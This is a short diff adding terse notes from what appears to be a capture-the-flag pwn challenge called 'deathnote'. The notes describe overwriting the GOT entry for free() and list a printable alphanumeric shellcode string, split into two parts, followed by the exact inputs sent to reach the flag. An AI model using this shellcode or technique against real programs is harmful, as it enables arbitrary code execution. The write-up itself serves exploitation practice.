@@ -1,0 +1,23 @@
+read the source
+found we can overwrite GOT
+need printable shellcode, google it!
+got this "PYj0X40PPPPQPaJRX4Dj0YIIIII0DN0RX502A05r9sOPTY01A01RX500D05cFZBPTY01SX540D05ZFXbPTYA01A01SX50A005XnRYPSX5AA005nnCXPSX5AA005plbXPTYA01Tx".
+to use this need to send the position to it.
+think about overwrite free(void*)
+it is too long, so spilt it to two part, and fix it.
+done!
+
+
+result:
+1
+-19
+PYj0X40PPPPQPaJRX4Dj0YAAAAA0DNzRX502A05r9sOPTY01A01RX500D05cFZBPTY<8uZ
+1
+0
+01SX540D05ZFXbPTYA01A01SX50A005XnRYPSX5AA005nnCXPSX5AA005plbXPTYA01Tx
+1
+0
+01SX540D05ZFXbPTYA01A01SX50A005XnRYPSX5AA005nnCXPSX5AA005plbXPTYA01Tx
+3
+-19
+/home/deathnote/flag.exe
